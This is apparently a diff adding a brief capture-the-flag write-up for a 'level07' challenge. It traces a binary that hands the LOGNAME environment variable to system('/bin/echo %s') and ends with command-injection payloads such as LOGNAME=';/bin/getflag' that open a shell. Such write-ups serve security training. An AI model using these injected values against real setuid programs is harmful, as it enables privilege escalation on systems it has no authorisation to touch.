@@ -1,0 +1,25 @@
+There is an binary which display level07 and doesnt seem to take any parameters or segfault after large strings
+
+gdb level07
+disas main
+
+we can see that's it set permissions then call getenv, asprintf, system at the end
+
+let's gather more informations with
+
+strings level07
+
+we can see all function call and also somewhere 'LOGNAME' which is an env variable and '/bin/echo %s'
+
+let's see if we're correct
+
+export LOGNAME=blabla
+
+level07 binary now print blabla we're on the good way
+
+since it call '/bin/echo %s'
+
+we can exploit that like this :
+
+export LOGNAME="OK;/bin/sh"
+export LOGNAME=';/bin/getflag'
